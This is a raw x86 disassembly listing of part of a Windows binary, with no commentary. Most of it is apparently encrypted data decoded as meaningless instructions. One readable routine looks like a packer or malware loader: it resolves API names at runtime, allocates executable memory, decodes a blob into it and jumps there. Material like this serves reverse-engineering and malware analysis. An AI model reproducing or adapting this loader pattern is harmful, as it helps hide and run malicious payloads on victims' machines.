  42126f:	jl     0x421242
  421271:	cmp    dh,dl
  421273:	dec    esi
  421274:	out    0x7f,eax
  421276:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421277:	xchg   ebx,eax
  421278:	mov    edx,0xa22ecab2
  42127d:	cli    
  42127e:	and    esi,DWORD PTR [ebp-0x5c]
  421281:	push   esp
  421282:	fsubr  QWORD PTR [ebp+0x5c]
  421285:	xchg   esi,eax
  421286:	sbb    bl,BYTE PTR [eax-0x2cee85a2]
  42128c:	jecxz  0x421286
  42128e:	mov    ah,0x42
  421290:	jmp    0x42126f
  421292:	mov    WORD PTR ss:[esi-0x62],fs
  421296:	fsub   QWORD PTR [edi+edx*2+0x3]
  42129a:	fst    QWORD PTR [esi-0x6]
  42129d:	nop
  42129e:	or     BYTE PTR [eax-0x7e4bc9f8],0x98
  4212a5:	xlat   BYTE PTR ds:[ebx]
  4212a6:	rcl    edx,1
  4212a8:	arpl   dx,si
  4212aa:	ret    0x7e6b
  4212ad:	bound  esi,QWORD PTR ds:0xf01312f1
  4212b3:	test   DWORD PTR [edi+0x12],esp
  4212b6:	ins    DWORD PTR es:[edi],dx
  4212b7:	add    eax,0x7bd05cca
  4212bc:	into   
  4212bd:	mov    cl,0x63
  4212bf:	and    al,0x3d
  4212c1:	and    ebp,esi
  4212c3:	out    0xf7,eax
  4212c5:	sub    DWORD PTR [esi-0x2e],esi
  4212c8:	mov    bh,0x6b
  4212ca:	cmp    al,0x31
  4212cc:	sub    DWORD PTR [edi+0x28dacbce],edi
  4212d2:	cmp    DWORD PTR [ecx+0x5a],ebp
  4212d5:	test   ch,ch
  4212d7:	imul   eax,DWORD PTR [esp+ebp*8+0x2b],0xffffff8a
  4212dc:	aad    0xfe
  4212de:	stc    
  4212df:	rcr    BYTE PTR [esi+0x7ea40b32],cl
  4212e5:	sub    al,0xc8
  4212e7:	rol    DWORD PTR [edi-0x7c],1
  4212ea:	data16 sbb BYTE PTR [edx+0x4c64f0a4],ah
  4212f1:	pop    eax
  4212f2:	pop    ecx
  4212f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4212f4:	dec    ecx
  4212f5:	in     eax,dx
  4212f6:	adc    DWORD PTR [edx+0x7d],ecx
  4212f9:	sub    DWORD PTR [ebp-0x7a],0x709c5434
  421300:	in     eax,0xe1
  421302:	mov    DWORD PTR [ebx-0x3ae4d148],eax
  421308:	inc    ecx
  42130a:	push   ebx
  42130b:	mov    edi,0xe70842ea
  421310:	and    eax,0xa956176d
  421315:	cld    
  421316:	jg     0x421350
  421318:	call   0x8fbeaa10
  42131d:	shl    BYTE PTR [ebx],cl
  42131f:	xchg   ebp,eax
  421320:	bnd jne 0x4212f4
  421323:	push   edx
  421324:	loope  0x4212bb
  421326:	adc    BYTE PTR [ebp-0x3b],dl
  421329:	jle    0x421336
  42132b:	(bad)  
  42132d:	inc    edi
  42132e:	sbb    al,0x1a
  421330:	fldenv [ebx]
  421332:	or     al,0x2c
  421334:	aas    
  421335:	js     0x42137e
  421337:	mov    edi,0x673c8ab2
  42133c:	adc    al,dh
  42133e:	mov    ds:0xf2720c90,eax
  421344:	mov    BYTE PTR [ecx],dl
  421346:	call   0x4f13:0xbd3cae8e
  42134d:	pop    ebx
  42134e:	(bad)  
  42134f:	jge    0x4212dd
  421351:	mov    edi,0xecff1bd8
  421356:	jno    0x42130c
  421358:	cmp    cl,bl
  42135a:	push   ecx
  42135b:	das    
  42135c:	jmp    0x78cc:0x6f0d3047
  421363:	pop    ds
  421364:	sahf   
  421365:	inc    eax
  421366:	or     edx,edx
  421368:	cmp    DWORD PTR [ebp+0x5e],esp
  42136b:	mov    ebx,0xe4b553f5
  421370:	cli    
  421371:	gs sti 
  421373:	repnz sbb bl,0x7b
  421377:	and    al,0x9c
  421379:	xor    al,0x48
  42137b:	in     al,0xdb
  42137d:	ror    dl,0x54
  421380:	push   ebx
  421381:	js     0x4213c1
  421383:	jae    0x42130d
  421385:	icebp  
  421386:	in     al,0x9e
  421388:	shr    ah,cl
  42138a:	add    cl,BYTE PTR [eax+0x1afd41f5]
  421390:	test   al,0x52
  421392:	das    
  421393:	(bad)  
  421394:	or     eax,0xdaaac060
  421399:	les    ecx,FWORD PTR gs:0xde4dc581
  4213a0:	pop    es
  4213a1:	cmp    edx,ebp
  4213a3:	pop    ebx
  4213a4:	outs   dx,BYTE PTR ds:[esi]
  4213a5:	mov    eax,0x8f1fb704
  4213aa:	xchg   ebx,eax
  4213ab:	bound  ebp,QWORD PTR [ebp-0x4457fb5]
  4213b1:	jl     0x421356
  4213b3:	sbb    DWORD PTR [eax+0x74],esi
  4213b6:	(bad)  
  4213b8:	into   
  4213b9:	inc    bp
  4213bb:	dec    ebp
  4213bc:	fsub   st(2),st
  4213be:	xor    eax,0x6798c27a
  4213c3:	xlat   BYTE PTR ds:[ebx]
  4213c4:	std    
  4213c5:	test   eax,0xb94ad557
  4213ca:	std    
  4213cb:	mov    bh,0xbd
  4213cd:	jb     0x4213f1
  4213cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4213d0:	mov    dl,BYTE PTR [edx]
  4213d2:	lea    ebp,[esi]
  4213d4:	int    0xa8
  4213d6:	mov    edx,DWORD PTR [ebp+0x2]
  4213d9:	sbb    esi,0x480dc0a2
  4213df:	sbb    ecx,DWORD PTR [ebp+0x30]
  4213e2:	aam    0x8b
  4213e4:	jmp    0x49ccc815
  4213e9:	sbb    bl,BYTE PTR [edx+0x1b]
  4213ec:	xor    dl,BYTE PTR [edi]
  4213ee:	out    dx,al
  4213ef:	push   edx
  4213f0:	inc    edx
  4213f1:	das    
  4213f2:	sub    DWORD PTR [edi+0x173bcd9c],eax
  4213f8:	inc    edi
  4213f9:	cdq    
  4213fa:	cwde   
  4213fb:	sbb    bh,BYTE PTR [ebp+0x6f]
  4213fe:	mov    al,0xf7
  421400:	test   eax,0x7090a78f
  421405:	fdiv   st,st(0)
  421407:	test   al,0xf3
  421409:	or     edi,edx
  42140b:	fld    QWORD PTR [edx+esi*2-0x9]
  42140f:	retf   0xba44
  421412:	dec    eax
  421413:	push   0xdf266616
  421418:	jge    0x4213ce
  42141a:	fwait
  42141b:	and    BYTE PTR [eax+0x2baeb5b6],ch
  421421:	push   eax
  421422:	ror    DWORD PTR [edi+0x58fb4ad5],1
  421428:	aam    0xd1
  42142a:	or     al,0xce
  42142c:	or     BYTE PTR [ebx],dh
  42142e:	mov    dl,BYTE PTR [esi]
  421430:	or     DWORD PTR [esi+0x1a],edx
  421433:	jg     0x421450
  421435:	mov    al,BYTE PTR [edx-0x6bfc3dcb]
  42143b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42143c:	jbe    0x4213e3
  42143e:	sbb    DWORD PTR [eax-0x7ea53e1d],0xfe57019b
  421448:	inc    eax
  421449:	ins    BYTE PTR es:[edi],dx
  42144a:	dec    edx
  42144b:	jns    0x421492
  42144d:	(bad)  
  42144e:	xlat   BYTE PTR ds:[ebx]
  42144f:	fs das 
  421451:	xor    al,bh
  421453:	pop    ebx
  421454:	in     eax,0xf1
  421456:	pop    edx
  421457:	jp     0x42142d
  421459:	jmp    0xe512:0xc2f3a352
  421460:	sub    al,0x75
  421462:	pop    edx
  421463:	sbb    bh,BYTE PTR [eax+0x77]
  421466:	(bad)  
  421468:	and    BYTE PTR [eax+0x534db668],bl
  42146e:	push   ss
  42146f:	sar    BYTE PTR [edx],1
  421471:	pusha  
  421472:	in     al,dx
  421473:	or     dh,BYTE PTR [eax-0xd4334e3]
  421479:	imul   edi,eax,0x5a03af2f
  42147f:	cmp    eax,0x2d858cd8
  421484:	adc    al,0x72
  421486:	(bad)  
  421487:	out    0xc9,al
  421489:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42148a:	scas   eax,DWORD PTR es:[edi]
  42148b:	pop    edx
  42148c:	lds    edi,FWORD PTR [ebp-0x4a2247e4]
  421492:	jl     0x421451
  421494:	loop   0x421495
  421496:	std    
  421497:	dec    ebx
  421498:	test   BYTE PTR [ecx+0x7d757448],dh
  42149e:	dec    edi
  42149f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4214a0:	jle    0x421477
  4214a2:	dec    edi
  4214a3:	(bad)  
  4214a4:	retf   0x6a1
  4214a7:	ins    BYTE PTR es:[edi],dx
  4214a8:	ins    BYTE PTR es:[edi],dx
  4214a9:	data16 fcmove st,st(4)
  4214ac:	sub    BYTE PTR [ecx],ch
  4214ae:	add    ebp,DWORD PTR [edi-0x26]
  4214b1:	pop    ecx
  4214b2:	jne    0x4214c7
  4214b4:	gs test eax,0x4c96a17b
  4214ba:	sbb    DWORD PTR [eax+0x349451ce],esp
  4214c0:	sub    dl,BYTE PTR [ebp-0x7ec7af58]
  4214c6:	shl    BYTE PTR [esp+esi*2],0x68
  4214ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4214cb:	lds    eax,FWORD PTR [ecx]
  4214cd:	inc    esi
  4214ce:	xor    DWORD PTR [ebx],edi
  4214d0:	out    dx,al
  4214d1:	adc    al,0xb4
  4214d3:	jmp    0x421554
  4214d5:	fwait
  4214d6:	sub    BYTE PTR [ebx+ebx*2-0x64ef4307],bl
  4214dd:	icebp  
  4214de:	nop
  4214df:	inc    ecx
  4214e0:	scas   al,BYTE PTR es:[edi]
  4214e1:	jnp    0x42151b
  4214e3:	fs loope 0x421556
  4214e6:	fcom   DWORD PTR [eax+0x1e0cdabd]
  4214ec:	fld    DWORD PTR [ebp-0x49]
  4214ef:	clc    
  4214f0:	ret    0xc2f2
  4214f3:	mov    ebp,DWORD PTR [edi]
  4214f5:	nop
  4214f6:	mov    esi,0xe23f73b9
  4214fb:	sub    ebx,DWORD PTR [edi+0x2a199ca9]
  421501:	aaa    
  421502:	mov    edx,0x1c927ecc
  421507:	mov    ds,WORD PTR [ebx+eiz*8]
  42150a:	jl     0x421504
  42150c:	sahf   
  42150d:	sub    bh,BYTE PTR [ecx+0x43b126fc]
  421513:	mov    al,ds:0x53533784
  421518:	sbb    esi,DWORD PTR [ecx+0x9]
  42151b:	enter  0x3a6b,0xa8
  42151f:	test   eax,0x146d1bf6
  421524:	dec    ebp
  421525:	mov    ch,0x72
  421527:	add    al,BYTE PTR [esi]
  421529:	rcl    esi,0x1b
  42152c:	or     bl,bl
  42152e:	outs   dx,DWORD PTR ds:[esi]
  42152f:	stos   BYTE PTR es:[edi],al
  421530:	(bad)
  421534:	and    eax,0x1d5d4963
  421539:	ror    cl,cl
  42153b:	mov    dh,0x69
  42153d:	xchg   BYTE PTR [eax+edi*8-0x38],al
  421541:	fiadd  DWORD PTR [ebx+0x5e]
  421544:	pop    ebp
  421545:	pop    ecx
  421546:	ret    
  421547:	nop
  421548:	nop
  421549:	nop
  42154a:	nop
  42154b:	nop
  42154c:	nop
  42154d:	nop
  42154e:	nop
  42154f:	nop
  421550:	push   ebp
  421551:	mov    ebp,esp
  421553:	sub    esp,0x70
  421556:	mov    DWORD PTR [ebp-0x48],0x0
  42155d:	mov    DWORD PTR [ebp-0x10],0x0
  421564:	mov    DWORD PTR [ebp-0x58],0x0
  42156b:	mov    DWORD PTR [ebp-0x8],0x0
  421572:	mov    DWORD PTR [ebp-0xc],0x0
  421579:	mov    DWORD PTR [ebp-0x30],0x0
  421580:	mov    DWORD PTR [ebp-0x4],0x0
  421587:	mov    DWORD PTR [ebp-0x5c],0x0
  42158e:	mov    DWORD PTR [ebp-0x54],0x0
  421595:	mov    DWORD PTR [ebp-0x18],0x0
  42159c:	mov    DWORD PTR [ebp-0x70],0x0
  4215a3:	mov    DWORD PTR [ebp-0x6c],0x0
  4215aa:	mov    DWORD PTR [ebp-0x2c],0x0
  4215b1:	mov    DWORD PTR [ebp-0x14],0x0
  4215b8:	mov    DWORD PTR [ebp-0x60],0x0
  4215bf:	mov    DWORD PTR [ebp-0x4c],0x0
  4215c6:	mov    DWORD PTR [ebp-0x50],0x0
  4215cd:	mov    DWORD PTR [ebp-0x68],0x0
  4215d4:	mov    eax,ds:0x428150
  4215d9:	mov    DWORD PTR [ebp-0x28],eax
  4215dc:	mov    ecx,DWORD PTR ds:0x428154
  4215e2:	mov    DWORD PTR [ebp-0x24],ecx
  4215e5:	mov    edx,DWORD PTR ds:0x428158
  4215eb:	mov    DWORD PTR [ebp-0x20],edx
  4215ee:	mov    al,ds:0x42815c
  4215f3:	mov    BYTE PTR [ebp-0x1c],al
  4215f6:	mov    ecx,DWORD PTR ds:0x428140
  4215fc:	mov    DWORD PTR [ebp-0x40],ecx
  4215ff:	mov    edx,DWORD PTR ds:0x428144
  421605:	mov    DWORD PTR [ebp-0x3c],edx
  421608:	mov    eax,ds:0x428148
  42160d:	mov    DWORD PTR [ebp-0x38],eax
  421610:	mov    cx,WORD PTR ds:0x42814c
  421617:	mov    WORD PTR [ebp-0x34],cx
  42161b:	mov    dl,BYTE PTR ds:0x42814e
  421621:	mov    BYTE PTR [ebp-0x32],dl
  421624:	mov    DWORD PTR [ebp-0x2c],0x40
  42162b:	mov    eax,DWORD PTR [ebp-0x70]
  42162e:	push   eax
  42162f:	call   DWORD PTR ds:0x428130
  421635:	mov    ecx,DWORD PTR [ebp-0x70]
  421638:	push   ecx
  421639:	call   DWORD PTR ds:0x428020
  42163f:	lea    edx,[ebp-0x10]
  421642:	push   edx
  421643:	lea    eax,[ebp-0x18]
  421646:	push   eax
  421647:	call   DWORD PTR ds:0x428000
  42164d:	test   eax,eax
  42164f:	jne    0x421662
  421651:	push   0x0
  421653:	call   DWORD PTR ds:0x428008
  421659:	mov    ecx,DWORD PTR [ebp-0x10]
  42165c:	add    ecx,0x1
  42165f:	mov    DWORD PTR [ebp-0x10],ecx
  421662:	mov    BYTE PTR [ebp-0x40],0x56
  421666:	call   DWORD PTR ds:0x42801c
  42166c:	mov    DWORD PTR [ebp-0x30],eax
  42166f:	mov    BYTE PTR [ebp-0x3e],0x72
  421673:	movzx  edx,WORD PTR [ebp-0x30]
  421677:	test   edx,edx
  421679:	jne    0x4216c5
  42167b:	mov    BYTE PTR [ebp-0x34],0x0
  42167f:	mov    DWORD PTR [ebp-0x18],0xe0d
  421686:	lea    eax,[ebp-0x28]
  421689:	push   eax
  42168a:	call   DWORD PTR ds:0x428018
  421690:	mov    DWORD PTR [ebp-0x60],eax
  421693:	mov    DWORD PTR [ebp-0x58],0x3a
  42169a:	lea    ecx,[ebp-0x40]
  42169d:	push   ecx
  42169e:	mov    edx,DWORD PTR [ebp-0x60]
  4216a1:	push   edx
  4216a2:	call   DWORD PTR ds:0x428014
  4216a8:	mov    DWORD PTR [ebp-0x44],eax
  4216ab:	mov    DWORD PTR [ebp-0x4],0xf4a9d49e
  4216b2:	mov    eax,DWORD PTR [ebp-0x60]
  4216b5:	push   eax
  4216b6:	call   DWORD PTR ds:0x428010
  4216bc:	mov    DWORD PTR [ebp-0x68],0x110577
  4216c3:	jmp    0x4216e5
  4216c5:	mov    BYTE PTR ds:0x447e30,0x0
  4216cc:	mov    BYTE PTR ds:0x42bd78,0x0
  4216d3:	push   0x38270
  4216d8:	call   DWORD PTR ds:0x428134
  4216de:	mov    BYTE PTR ds:0x445750,0x0
  4216e5:	mov    DWORD PTR [ebp-0x30],0x410000
  4216ec:	mov    ecx,DWORD PTR [ebp-0x70]
  4216ef:	push   ecx
  4216f0:	call   DWORD PTR ds:0x428034
  4216f6:	push   DWORD PTR [ebp-0x2c]
  4216f9:	push   0x1000
  4216fe:	mov    eax,DWORD PTR [ebp-0x18]
  421701:	add    eax,0x23
  421704:	add    eax,0x23
  421707:	push   eax
  421708:	xor    eax,eax
  42170a:	push   eax
  42170b:	mov    ecx,DWORD PTR [ebp-0x44]
  42170e:	call   ecx
  421710:	mov    edx,eax
  421712:	mov    DWORD PTR [ebp-0x8],edx
  421715:	mov    edx,DWORD PTR [ebp-0x68]
  421718:	sub    edx,0xdae0b
  42171e:	mov    DWORD PTR [ebp-0x68],edx
  421721:	cmp    DWORD PTR [ebp-0x8],0x0
  421725:	jne    0x42172e
  421727:	mov    BYTE PTR ds:0x445750,0x0
  42172e:	mov    eax,DWORD PTR [ebp-0x8]
  421731:	add    eax,DWORD PTR [ebp-0x18]
  421734:	mov    ecx,DWORD PTR [ebp-0x4]
  421737:	mov    DWORD PTR [eax],ecx
  421739:	push   0x64
  42173b:	push   0x0
  42173d:	call   DWORD PTR ds:0x42804c
  421743:	push   DWORD PTR ds:0x428018
  421749:	pop    edx
  42174a:	mov    DWORD PTR [ebp-0x6c],edx
  42174d:	mov    edx,DWORD PTR [ebp-0x8]
  421750:	add    edx,DWORD PTR [ebp-0x58]
  421753:	mov    DWORD PTR [ebp-0x5c],edx
  421756:	mov    eax,ds:0x428014
  42175b:	mov    DWORD PTR [ebp-0x4c],eax
  42175e:	mov    ecx,DWORD PTR [ebp-0x8]
  421761:	add    ecx,DWORD PTR [ebp-0x18]
  421764:	mov    edx,DWORD PTR [ebp+0x8]
  421767:	mov    DWORD PTR [ecx+0x4],edx
  42176a:	mov    eax,DWORD PTR [ebp-0x8]
  42176d:	add    eax,DWORD PTR [ebp-0x18]
  421770:	mov    DWORD PTR [ebp-0xc],eax
  421773:	mov    ecx,DWORD PTR [ebp-0x60]
  421776:	push   ecx
  421777:	call   DWORD PTR ds:0x428048
  42177d:	cmp    DWORD PTR [ebp-0x68],0x0
  421781:	jbe    0x42179e
  421783:	mov    edx,DWORD PTR [ebp-0xc]
  421786:	push   edx
  421787:	mov    eax,DWORD PTR [ebp-0x18]
  42178a:	push   eax
  42178b:	mov    ecx,DWORD PTR [ebp-0x30]
  42178e:	add    ecx,DWORD PTR [ebp-0x68]
  421791:	push   ecx
  421792:	mov    edx,DWORD PTR [ebp-0x8]
  421795:	push   edx
  421796:	call   0x411000
  42179b:	add    esp,0x10
  42179e:	push   0xffff
  4217a3:	mov    eax,DWORD PTR [ebp-0x70]
  4217a6:	push   eax
  4217a7:	call   DWORD PTR ds:0x428054
  4217ad:	cmp    DWORD PTR [ebp-0x5c],0x0
  4217b1:	je     0x4217c1
  4217b3:	push   DWORD PTR [ebp-0x4c]
  4217b6:	push   DWORD PTR [ebp-0x6c]
  4217b9:	mov    edx,DWORD PTR [ebp-0x5c]
  4217bc:	push   eax
  4217bd:	jmp    edx
  4217bf:	jmp    0x4217d2
  4217c1:	mov    ecx,DWORD PTR [ebp+0x8]
  4217c4:	mov    DWORD PTR [ebp-0x14],ecx
  4217c7:	push   0x0
  4217c9:	push   0x3d
  4217cb:	push   0x20
  4217cd:	call   0x4229f6
  4217d2:	mov    eax,0x1
  4217d7:	mov    esp,ebp
  4217d9:	pop    ebp
  4217da:	ret    
  4217db:	int3   
  4217dc:	int3   
  4217dd:	int3   
  4217de:	int3   
  4217df:	int3   
  4217e0:	push   ebp
  4217e1:	mov    ebp,esp
  4217e3:	sub    esp,0x8
  4217e6:	push   esi
  4217e7:	mov    DWORD PTR [ebp-0x4],0x0
  4217ee:	call   DWORD PTR ds:0x42802c
  4217f4:	mov    eax,ds:0x42801c
  4217f9:	push   0x0
  4217fb:	push   0x0
  4217fd:	push   0x0
  4217ff:	push   0x0
  421801:	mov    DWORD PTR [ebp-0x8],eax
  421804:	call   0x4229f0
  421809:	call   DWORD PTR ds:0x428028
  42180f:	push   0x0
  421811:	push   0x4e
  421813:	push   0x1e
  421815:	push   0x0
  421817:	push   0xffffffff
  421819:	call   DWORD PTR ds:0x428024
  42181f:	mov    esi,DWORD PTR [ebp-0x8]
  421822:	call   esi
  421824:	mov    DWORD PTR [ebp-0x4],eax
  421827:	mov    esi,DWORD PTR [ebp-0x4]
  42182a:	cmp    esi,0x57
  42182d:	jne    0x42183c
  42182f:	push   0xfd6308da
  421834:	call   0x421550
  421839:	add    esp,0x4
  42183c:	push   esi
  42183d:	call   DWORD PTR ds:0x428034
  421843:	xor    eax,eax
  421845:	pop    esi
  421846:	mov    esp,ebp
  421848:	pop    ebp
  421849:	ret    
  42184a:	nop
  42184b:	nop
  42184c:	nop
  42184d:	nop
  42184e:	nop
  42184f:	nop
  421850:	sub    esp,0x10
  421853:	push   0xa
  421855:	push   0x0
  421857:	push   0x0
  421859:	call   DWORD PTR ds:0x428044
  42185f:	call   DWORD PTR ds:0x428040
  421865:	lea    eax,[esp+0x0]
  421869:	push   eax
  42186a:	call   DWORD PTR ds:0x42803c
  421870:	push   0x0
  421872:	call   DWORD PTR ds:0x428038
  421878:	cmp    WORD PTR [esp+0x0],0x0
  42187e:	push   0x0
  421880:	je     0x421899
  421882:	push   0x0
  421884:	call   DWORD PTR ds:0x428138
  42188a:	push   0x0
  42188c:	call   0x4217e0
  421891:	add    esp,0x4
  421894:	jmp    0x4229cc
  421899:	call   DWORD PTR ds:0x428050
  42189f:	dec    DWORD PTR [ecx-0x47]
  4218a2:	ucomiss xmm3,xmm0
  4218a5:	hlt    
  4218a6:	mov    al,0x1e
  4218a8:	xor    dl,BYTE PTR [edx-0x2e]
  4218ab:	stos   DWORD PTR es:[edi],eax
  4218ac:	mov    ds:0x969fe3fb,al
  4218b1:	fcomi  st,st(4)
  4218b3:	mov    al,0x1e
  4218b5:	ss push edx
  4218b7:	shr    bl,cl
  4218b9:	pop    ebp
  4218ba:	add    al,0xe3
  4218bc:	lahf   
  4218bd:	cs fcomi st,st(4)
  4218c0:	mov    al,0x1e
  4218c2:	ss push edx
  4218c4:	shr    BYTE PTR [ebx-0x601cfba3],cl
  4218ca:	cs fcomi st,st(4)
  4218cd:	mov    al,0x1e
  4218cf:	ss push edx
  4218d1:	shr    BYTE PTR [ebx-0x601cfba3],cl
  4218d7:	cs fcomi st,st(4)
  4218da:	mov    al,0x1e
  4218dc:	into   
  4218dd:	push   edx
  4218de:	shr    BYTE PTR [ebx-0x6ea6e4ad],cl
  4218e4:	outs   dx,DWORD PTR cs:[esi]
  4218e6:	std    
  4218e7:	jge    0x421928
  4218e9:	mov    ss,WORD PTR [ebx-0x62]
  4218ec:	data16 jl 0x42193f
  4218ef:	mov    esi,esi
  4218f1:	pop    ebp
  4218f2:	sti    
  4218f3:	test   dl,al
  4218f5:	jno    0x421948
  4218f7:	and    BYTE PTR [ebx-0x7d98823a],dh
  4218fd:	icebp  
  4218fe:	inc    eax
  4218ff:	mov    ah,0x80
  421901:	nop
  421902:	jl     0x421957
  421904:	jb     0x4218a6
  421906:	fidiv  WORD PTR [ebx]
  421908:	and    al,0x8a
  42190a:	icebp  
  42190b:	push   cs
  42190c:	lahf   
  42190d:	mov    ebx,0x3d5b3ee3
  421912:	mov    dh,0xce
  421914:	jae    0x42191f
  421916:	out    dx,al
  421917:	xchg   ebp,eax
  421918:	or     bl,bl
  42191a:	hlt    
  42191b:	mov    al,0x1e
  42191d:	ss push edx
  42191f:	shr    BYTE PTR [esp+eax*8-0x29234508],cl
  421926:	dec    ecx
  421927:	(bad)  
  421928:	repz out 0xa4,al
  42192b:	pop    eax
  42192c:	xchg   ecx,eax
  42192d:	push   ebx
  42192e:	iret   
  42192f:	push   cs
  421930:	mov    ebx,0xabd122fa
  421935:	dec    eax
  421936:	mov    WORD PTR [edx+ecx*1],?
  421939:	mov    bh,0x93
  42193b:	push   edi
  42193c:	(bad)  
  42193d:	sbb    ecx,DWORD PTR ds:0x89918324
  421943:	adc    al,0x5e
  421945:	stos   BYTE PTR es:[edi],al
  421946:	inc    eax
  421947:	mov    eax,ds:0x95da8a71
  42194c:	push   0x54ba6623
  421951:	mov    dh,0x43
  421953:	fsub   st,st(1)
  421955:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421956:	xchg   esi,eax
  421957:	jmp    0xff1cc831
  42195c:	call   0x919abe47
  421961:	push   ebx
  421962:	into   
  421963:	push   cs
  421964:	retf   
  421965:	mov    sp,0x4bd1
  421969:	push   0x2a1f3c9e
  42196e:	cmp    DWORD PTR [edi+0x5c],edx
  421971:	xchg   BYTE PTR [edx+0x220cd324],ah
  421977:	adc    al,0x6e
  421979:	aaa    
  42197a:	fisub  DWORD PTR [ecx-0x6a8e03e1]
  421980:	jbe    0x421940
  421982:	sti    
  421983:	mov    edx,0xd8c0ce5c
  421988:	stc    
  421989:	xor    al,0x67
  42198b:	mov    ebx,esp
  42198d:	(bad)  
  42198e:	dec    ecx
  42198f:	(bad)  
  421990:	mov    al,0x1e
  421992:	ss push edx
  421994:	shr    BYTE PTR [ebx-0x254cfba3],cl
  42199a:	fstp   TBYTE PTR cs:[eax-0x41c9e34f]
  4219a1:	xor    esp,esi
  4219a3:	adc    al,BYTE PTR [ebx+eiz*8]
  4219a6:	lahf   
  4219a7:	cs fcomi st,st(4)
  4219aa:	mov    al,0x1e
  4219ac:	(bad)  
  4219ad:	push   edx
  4219ae:	shr    DWORD PTR [edx-0x6016faaa],1
  4219b4:	cs aaa 
  4219b6:	lock mov al,0x1e
  4219b9:	xor    dl,BYTE PTR [edx+edx*8-0x55]
  4219bd:	pop    ebp
  4219be:	add    al,0xe3
  4219c0:	sahf   
  4219c1:	xchg   ebx,eax
  4219c2:	fcomi  st,st(4)
  4219c4:	mov    al,0xe
  4219c6:	ss push edx
  4219c8:	shr    BYTE PTR [ebx-0x601cfba8],cl
  4219ce:	outs   dx,DWORD PTR ds:[esi]
  4219cf:	fcomi  st,st(4)
  4219d1:	mov    al,ds:0xd052361e
  4219d6:	stos   DWORD PTR es:[edi],eax
  4219d7:	pop    ebp
  4219d8:	add    ebx,esp
  4219da:	sahf   
  4219db:	cs fcomi st,st(4)
  4219de:	mov    al,0x1e
  4219e0:	xor    edx,DWORD PTR [edx-0x2d]
  4219e3:	stos   DWORD PTR es:[edi],eax
  4219e4:	pop    ebp
  4219e5:	add    al,0xe3
  4219e7:	lahf   
  4219e8:	cs pop ebx
  4219ea:	push   DWORD PTR [eax-0x2dadcde2]
  4219f0:	push   ss
  4219f1:	ins    BYTE PTR es:[edi],dx
  4219f2:	add    ebx,esp
  4219f4:	popf   
  4219f5:	(bad)  cs:[eax+esi*4+0x1e]
  4219fa:	es push edx
  4219fc:	sar    BYTE PTR [ebx-0x601cfba3],cl
  421a02:	ds fcomi st,st(4)
  421a05:	mov    al,ds:0xd252361e
  421a0a:	stos   DWORD PTR es:[edi],eax
  421a0b:	pop    ebp
  421a0c:	adc    al,0xe3
  421a0e:	lahf   
  421a0f:	cs fcomi st,st(4)
  421a12:	mov    al,0x1e
  421a14:	ss push edx
  421a16:	shr    BYTE PTR [ebx-0x60179527],cl
  421a1c:	inc    edi
  421a1d:	fdiv   st,st(4)
  421a1f:	mov    al,0x1e
  421a21:	push   es
  421a22:	pop    ecx
  421a23:	shl    BYTE PTR [eax+eiz*2+0x4],cl
  421a27:	jecxz  0x4219c8
  421a29:	cs fcomi st,st(4)
  421a2c:	mov    al,0x1e
  421a2e:	ss push edx
  421a30:	shr    BYTE PTR [ebx-0x601cfba3],cl
  421a36:	cs fcomi st,st(4)
  421a39:	mov    al,0x1e
  421a3b:	ss push edx
  421a3d:	shr    BYTE PTR [ebx-0x601cfba3],cl
  421a43:	cs fcomi st,st(4)
  421a46:	mov    al,0x1e
  421a48:	ss push edx
  421a4a:	shr    BYTE PTR [ebx-0x601cfba3],cl
  421a50:	cs fcomi st,st(4)
  421a53:	mov    al,0x1e
  421a55:	ss push edx
  421a57:	shr    BYTE PTR [ebx-0x601cfba3],cl
  421a5d:	cs fcomi st,st(4)
  421a60:	mov    al,0x1e
  421a62:	ss push edx
  421a64:	shr    BYTE PTR [ebx-0x601cfba3],cl
  421a6a:	cs fcomi st,st(4)
  421a6d:	mov    al,0x1e
  421a6f:	ss push edx
  421a71:	shr    BYTE PTR [ebx-0x601cfba3],cl
  421a77:	cs fcomi st,st(4)
  421a7a:	mov    al,0x1e
  421a7c:	ss push edx
  421a7e:	shr    BYTE PTR [ebx-0x601cfba3],cl
  421a84:	cs fcomi st,st(4)
  421a87:	mov    al,0x1e
  421a89:	ss push edx
  421a8b:	shr    BYTE PTR [ebx-0x4e1cfba3],cl
  421a91:	pop    edx
  421a92:	mov    esi,0x361ec48c
  421a97:	push   edx
  421a98:	ror    BYTE PTR [ebx-0x701cfbaa],cl
  421a9e:	cs fcomi st,st(4)
  421aa1:	mov    bl,BYTE PTR [edx]
  421aa3:	ss push edx
  421aa5:	(bad)  
  421aa6:	stos   DWORD PTR es:[edi],eax
  421aa7:	pop    ebp
  421aa8:	push   esp
  421aa9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421aaa:	fcomp  QWORD PTR [edi+ecx*4]
  421aad:	mov    ebx,0x52361eb0
  421ab2:	shr    BYTE PTR [ebx+0x7fe3047d],cl
  421ab8:	add    BYTE PTR [ecx+0x367dc287],ch
  421abe:	push   edx
  421abf:	shr    BYTE PTR [ebx-0x601cfbf3],cl
  421ac5:	push   ds
  421ac6:	shl    ah,1
  421ac8:	mov    al,0x4e
  421aca:	ss push edx
  421acc:	rcl    BYTE PTR [ebp-0x601cfba7],cl
  421ad2:	cs fcomi st,st(4)
  421ad5:	mov    al,0x1e
  421ad7:	ss push edx
  421ad9:	shr    BYTE PTR [ebx-0x601cdba3],cl
  421adf:	into   
  421ae0:	fcomi  st,st(4)
  421ae2:	mov    al,0x1e
  421ae4:	ss push edx
  421ae6:	shr    BYTE PTR [ebx-0x601cfba3],cl
  421aec:	cs fcomi st,st(4)
  421aef:	mov    al,0x1e
  421af1:	ss push edx
  421af3:	shr    BYTE PTR [ebx-0x601cfba3],cl
  421af9:	cs fcomi st,st(4)
  421afc:	mov    al,0x1e
  421afe:	ss push edx
  421b00:	shr    BYTE PTR [ebx-0x601cfba3],cl
  421b06:	cs fcomi st,st(4)
  421b09:	mov    al,0x1e
  421b0b:	ss push edx
